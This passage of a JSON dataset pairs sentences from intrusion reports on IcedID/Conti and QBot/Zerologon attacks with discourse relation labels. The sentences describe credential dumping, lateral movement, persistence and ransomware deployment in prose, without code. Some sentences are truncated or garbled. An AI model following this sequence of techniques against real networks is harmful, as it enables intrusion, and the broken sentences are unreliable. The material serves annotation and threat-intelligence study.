        "S1": "The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.",
        "S2": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
        "relation": "NEXT"
    },
    {
        "S1": "After a gap of almost an hour, a Cobalt Strike beacon was dropped and executed on the beachhead host.",
        "S2": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
        "relation": "NEXT"
    },
    {
        "S1": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
        "S2": "Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
        "S2": "Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
        "S2": "Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.",
        "S2": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "Use of these 3rd party administrative tools allow the threat actors another \u201clegitimate\u201d means of persistence and access if they were to lose their malware connection.",
        "S2": "On the following day, the seventh day of the intrusion, the threat actors made their next move.",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration.",
        "S2": "After getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access.",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration.",
        "S2": "We believe the operator used the publicly available script \u2018sam_the_admin\u2018 or a variant based on it.",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration.",
        "S2": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
        "relation": "MISC"
    },
    {
        "S1": "Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.",
        "S2": "On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used.",
        "relation": "MISC"
    },
    {
        "S1": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
        "S2": "On the 19th day of the intrusion, the threat actors prepared for their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
        "S2": "From the beachhead host, a DLL was transferred to a domain controller over SMB and then a remote service was created on the domain controller to execute the Cobalt Strike DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "On the following day, the seventh day of the intrusion, the threat actors made their next move.",
        "S2": "From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again.",
        "relation": "MISC"
    },
    {
        "S1": "On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used.",
        "S2": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used.",
        "S2": "On day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access.",
        "S2": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "relation": "MISC"
    },
    {
        "S1": "From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again.",
        "S2": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "After this, the threat actors went quiet.",
        "S2": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "relation": "MISC"
    },
    {
        "S1": "On day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time.",
        "S2": "This time the execution worked as intended and resulted in domain wide ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "On day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time.",
        "S2": "While these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "S2": "They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "S2": "On the 19th day, the threat actors moved towards their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "S2": "We didn\u2019t dig into reversing this DLL, as a detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "They reviewed the directory structure of several hosts including domain controllers and backup servers.",
        "S2": "While these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat.",
        "S2": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors had already secured domain admin access but it\u2019s possible the operator may have thought they lacked permissions when their first ransomware execution failed.",
        "S2": "We believe the operator used the publicly available script \u2018sam_the_admin\u2018 or a variant based on it.",
        "relation": "MISC"
    },
    {
        "S1": "While these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers.",
        "S2": "The second discovery was from a different Cobalt Strike beacon \u201cFaicuy4.exe\u201d which focused on domain discovery and user groups using the net command.",
        "relation": "MISC"
    },
    {
        "S1": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
        "S2": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
        "S2": "The IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a \u201cStolen Image Evidence\u201d email campaign.",
        "relation": "MISC"
    },
    {
        "S1": "This time the execution worked as intended and resulted in domain wide ransomware.",
        "S2": "Only one scheduled task was created during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a \u201cStolen Image Evidence\u201d email campaign.",
        "S2": "Threat actors dropped and installed Atera agent (T1219), using two MSI packages \u201csql.msi\u201d and \u201cmstsc.msi\u201d, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The graph below shows detailed actions performed through IcedID, including reconnaissance and Cobalt Strike beacons drops:",
        "S2": "Threat actors dropped and installed Atera agent (T1219), using two MSI packages \u201csql.msi\u201d and \u201cmstsc.msi\u201d, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Only one scheduled task was created during this intrusion.",
        "S2": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors dropped and installed Atera agent (T1219), using two MSI packages \u201csql.msi\u201d and \u201cmstsc.msi\u201d, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.",
        "S2": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "relation": "NEXT"
    },
    {
        "S1": "Threat actors dropped and installed Atera agent (T1219), using two MSI packages \u201csql.msi\u201d and \u201cmstsc.msi\u201d, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.",
        "S2": "Atera agent is a remote monitoring and management system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The installation of those two packages reveals two emails potentially belonging to the ransomware operators or affiliates:",
        "S2": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "relation": "MISC"
    },
    {
        "S1": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "S2": "We observed the IcedID DLL dropping multiple CS beacons on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "S2": "A number of process injections were seen during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "S2": "The threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.",
        "relation": "MISC"
    },
    {
        "S1": "This attempt failed, however, there were indicators through DNS requests enumerating accounts for the existence of SAMTHEADMIN-XX (XX being a random number).",
        "S2": "This resulted in files being encrypted and a \u2018readme.txt\u2019 ransom note generated on the hosts:",
        "relation": "MISC"
    },
    {
        "S1": "We believe the operator used the publicly available script \u2018sam_the_admin\u2018 or a variant based on it.",
        "S2": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "relation": "MISC"
    },
    {
        "S1": "A base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001).",
        "S2": "The initial discovery techniques were conducted on the beachhead host by the IcedID malware \u2013 focusing on determining the system language and security products installed (T1518.001).",
        "relation": "ELABORATION"
    },
    {
        "S1": "A number of process injections were seen during this intrusion.",
        "S2": "On the 19th day of the intrusion, the threat actors prepared for their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "The usage of this function triggers the Sysmon Event ID 8, a well known pattern of CS beacon activity.",
        "S2": "Those \u201cDesiredAccess\u201d values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.",
        "S2": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "The screenshot below shows the different \u201cDesiredAccess\u201d to the LSASS process object from different beacons (dllhost.exe, Edebef4.dll, etc.) or Task Manager:",
        "S2": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "The table below maps the \u201cDesiredAccess\u201d values with the actual corresponding access rights, and examples of credentials dumping tools requesting those accesses:",
        "S2": "Those \u201cDesiredAccess\u201d values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "S2": "It is highly likely that the threat actors were establishing the country of origin based on the language used \u2013",
        "relation": "MISC"
    },
    {
        "S1": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "S2": "We observed the IcedID DLL dropping multiple CS beacons on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "Change Control Page (ChCP) is a Microsoft utility for changing the console control page (language).",
        "S2": "The Microsoft link shows the number of the language used (437 \u2013 United States).",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is highly likely that the threat actors were establishing the country of origin based on the language used \u2013",
        "S2": "Once the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).",
        "relation": "MISC"
    },
    {
        "S1": "The second discovery was from a different Cobalt Strike beacon \u201cFaicuy4.exe\u201d which focused on domain discovery and user groups using the net command.",
        "S2": "On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL\u2019s onto a domain controller and another server.",
        "relation": "MISC"
    },
    {
        "S1": "Once the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).",
        "S2": "On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL\u2019s onto a domain controller and another server.",
        "relation": "MISC"
    },
    {
        "S1": "On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL\u2019s onto a domain controller and another server.",
        "S2": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL\u2019s onto a domain controller and another server.",
        "S2": "Note that the named pipes followed MSSE-[0-9]{4}-server pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:",
        "relation": "MISC"
    },
    {
        "S1": "Services were then created on the hosts to execute the uploaded Cobalt Strike Beacons.",
        "S2": "The beacons were then executed using a remote service.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "S2": "After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers.",
        "relation": "MISC"
    },
    {
        "S1": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "S2": "Known Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Known Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons.",
        "S2": "Note that the named pipes followed MSSE-[0-9]{4}-server pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note that the named pipes followed MSSE-[0-9]{4}-server pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:",
        "S2": "We observed a default Cobalt Strike malleable C2 profile, using the jquery agent string.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note that the named pipes followed MSSE-[0-9]{4}-server pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:",
        "S2": "Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors used Splashtop Streamer via Atera agent, allowing them to remotely connect to machines without using RDP tunneling or other techniques previously seen in our cases.",
        "S2": "We observed a default Cobalt Strike malleable C2 profile, using the jquery agent string.",
        "relation": "MISC"
    },
    {
        "S1": "We observed a default Cobalt Strike malleable C2 profile, using the jquery agent string.",
        "S2": "Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers.",
        "relation": "MISC"
    },
    {
        "S1": "We observed a default Cobalt Strike malleable C2 profile, using the jquery agent string.",
        "S2": "Just based on the ET Cobalt Strike rule, \u2018ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\u2019, there were in excess of 6K alerts generated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Just based on the ET Cobalt Strike rule, \u2018ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\u2019, there were in excess of 6K alerts generated.",
        "S2": "We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.",
        "relation": "MISC"
    },
    {
        "S1": "Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers.",
        "S2": "On the 19th day of the intrusion, the threat actors prepared for their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.",
        "S2": "We did not observe any exfiltration indicators while analyzing host and network forensic artifacts.",
        "relation": "MISC"
    },
    {
        "S1": "We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.",
        "S2": "This does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.",
        "relation": "MISC"
    },
    {
        "S1": "We did not observe any exfiltration indicators while analyzing host and network forensic artifacts.",
        "S2": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "relation": "NEXT"
    },
    {
        "S1": "This does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.",
        "S2": "After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers.",
        "relation": "MISC"
    },
    {
        "S1": "On the 19th day of the intrusion, the threat actors prepared for their final objectives.",
        "S2": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "S2": "Once they established this access, around twenty minutes later, they again attempted the ransomware deployment and this time the payload executed properly and began spreading across the network via SMB.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "S2": "This x64.dll DLL contains fingerprints, \u201cconti_v3.dll\u201d, seen in our previous cases:",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "S2": "The threat actors then proceeded to look for other elevation paths.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.",
        "S2": "Once the threat actors pushed the encryptor to C$, an excessive SMB network activity were generated in a short period of time (~7K) as indicated by the chart.",
        "relation": "NEXT"
    },
    {
        "S1": "We didn\u2019t dig into reversing this DLL, as a detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware.",
        "S2": "The ransom note has slightly been modified from our last Conti cases:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL.",
        "S2": "Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL.",
        "S2": "Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL.",
        "S2": "The threat actor gained their initial access through the execution of a malicious DLL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first activity of QBot was seen 5 minutes after the DLL was executed.",
        "S2": "The execution chain for this QBot infection can be seen below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence.",
        "S2": "Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL.",
        "relation": "MISC"
    },
    {
        "S1": "Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence.",
        "S2": "No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N",
        "S2": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "relation": "MISC"
    },
    {
        "S1": "The executable named cool.exe to an empty string, retrieves the Domain Admin password Hash, and Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability.",
        "S2": "The domain admin hash was then used on the beachhead through an over-pass-the-hash attack .",
        "relation": "NEXT"
    },
    {
        "S1": "The executable named cool.exe to an empty string, retrieves the Domain Admin password Hash, and Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability.",
        "S2": "After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.",
        "relation": "NEXT"
    },
    {
        "S1": "After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.",
        "S2": "To conclude this case, the threat actors were evicted from the network before they completed any further objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "To conclude this case, the threat actors were evicted from the network before they completed any further objectives.",
        "S2": "The threat actor gained their initial access through the execution of a malicious DLL.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained their initial access through the execution of a malicious DLL.",
        "S2": "In this case, however, the execution started directly from the qbot DLL found here",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor gained their initial access through the execution of a malicious DLL.",
        "S2": "Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.",
        "relation": "NEXT"
    },
    {
        "S1": "Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL.",
        "S2": "Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.",
        "relation": "NEXT"
    },
    {
        "S1": "The execution chain for this QBot infection can be seen below:",
        "S2": "- Copy of QBot DLL",
        "relation": "MISC"
    },
    {
        "S1": "We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values.",
        "S2": "- obfuscated PowerShell script that is referenced by the scheduled task.",
        "relation": "MISC"
    },
    {
        "S1": "We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values.",
        "S2": "Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.",
        "relation": "MISC"
    },
    {
        "S1": "- Copy of QBot DLL",
        "S2": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "relation": "MISC"
    },
    {
        "S1": "- Copy of QBot DLL",
        "S2": "The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "S2": "The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "S2": "The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.",
        "S2": "The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu .",
        "relation": "ELABORATION"
    },
    {
        "S1": "OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module:",
        "S2": "The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu .",
        "relation": "MISC"
    },
    {
        "S1": "The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu .",
        "S2": "The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.",
        "relation": "MISC"
    },
    {
        "S1": "Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc.",
        "S2": "The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.",
        "S2": "Spike in traffic from file share server to Cobalt Strike command and control server.",
        "relation": "MISC"
    },
    {
        "S1": "Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.",
        "S2": "After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.",
        "relation": "NEXT"
    },
    {
        "S1": "As explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV :",
        "S2": "Multiple services were installed by Cobalt Strike across the environment, here are a few examples:",
        "relation": "MISC"
    },
    {
        "S1": "As explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV :",
        "S2": "Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default).",
        "relation": "MISC"
    },
    {
        "S1": "After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.",
        "S2": "While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165.",
        "relation": "MISC"
    },
    {
        "S1": "The explorer shell was also restarted by the threat actor:",
        "S2": "The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash We have seen the use of over-pass-the-hash several times before.",
        "relation": "MISC"
    },
    {
        "S1": "Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.",
        "S2": "Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.",
        "S2": "QBot initially starts a number of processes to collect information about the affected system.",
        "relation": "MISC"
    },
    {
        "S1": "Multiple services were installed by Cobalt Strike across the environment, here are a few examples:",
        "S2": "While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165.",
        "relation": "MISC"
    },
    {
        "S1": "While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165.",
        "S2": "The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.",
        "S2": "Spike in traffic from file share server to Cobalt Strike command and control server.",
        "relation": "MISC"
    },
    {
        "S1": "We did not observe the initial access for this case but assess with medium to high confidence that a malicious email campaign was used to deliver an Excel (xls) document.",
        "S2": "Minutes later, the beachhead host did the same thing to another adjacent workstation and then another, and before we knew it, all workstations in the environment were compromised.",
        "relation": "NEXT"
    },
    {
        "S1": "Following the opening of the xls document, the initial Qbot DLL loader was downloaded and saved to disk.",
        "S2": "Once executed, the Qbot process creates a scheduled task to elevate itself to system.",
        "relation": "NEXT"
    },
    {
        "S1": "Qbot injected into many processes but one favorite in this intrusion, was Microsoft Remote Assistance (msra.exe).",
        "S2": "Around the same time, LSASS was access by Qbot to collect credentials from memory.",
        "relation": "MISC"
    },
    {
        "S1": "Qbot injected into many processes but one favorite in this intrusion, was Microsoft Remote Assistance (msra.exe).",
        "S2": "At around 50 minutes into the infection, the beachhead host copied a Qbot dll to an adjacent workstation, which was then executed by remotely creating a service.",
        "relation": "MISC"
    },
    {
        "S1": "Within minutes of landing on the beachhead, a series of discovery commands were executed using Microsoft utilities.",
        "S2": "These commands where executed on the beachhead system along with other workstations compromised through lateral movement.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At around 50 minutes into the infection, the beachhead host copied a Qbot dll to an adjacent workstation, which was then executed by remotely creating a service.",
        "S2": "Servers were not accessed in this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "At around 50 minutes into the infection, the beachhead host copied a Qbot dll to an adjacent workstation, which was then executed by remotely creating a service.",
        "S2": "Qbot followed it\u2019s normal process on each machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Minutes later, the beachhead host did the same thing to another adjacent workstation and then another, and before we knew it, all workstations in the environment were compromised.",
        "S2": "We assess with medium to high confidence that the QBot infection was delivered to the system via a malspam campaign through a hidden 4.0 Macro\u2019s in Excel.",
        "relation": "MISC"
    },
    {
        "S1": "Qbot followed it\u2019s normal process on each machine.",
        "S2": "We believe this is the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
        "relation": "MISC"
    },
    {
        "S1": "After this activity, normal beaconing occurred but no further actions on objectives were seen.",
        "S2": "We believe this is the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
        "relation": "MISC"
    },
    {
        "S1": "We assess with medium to high confidence that the QBot infection was delivered to the system via a malspam campaign through a hidden 4.0 Macro\u2019s in Excel.",
        "S2": "The QBot dll was executed on the system and shortly after, injected into the msra.exe process.",
        "relation": "NEXT"
    },
    {
        "S1": "We believe this is the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
        "S2": "A scheduled task was created by Qbot to escalate to SYSTEM privileges.",
        "relation": "NEXT"
    },
    {
        "S1": "We believe this is the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
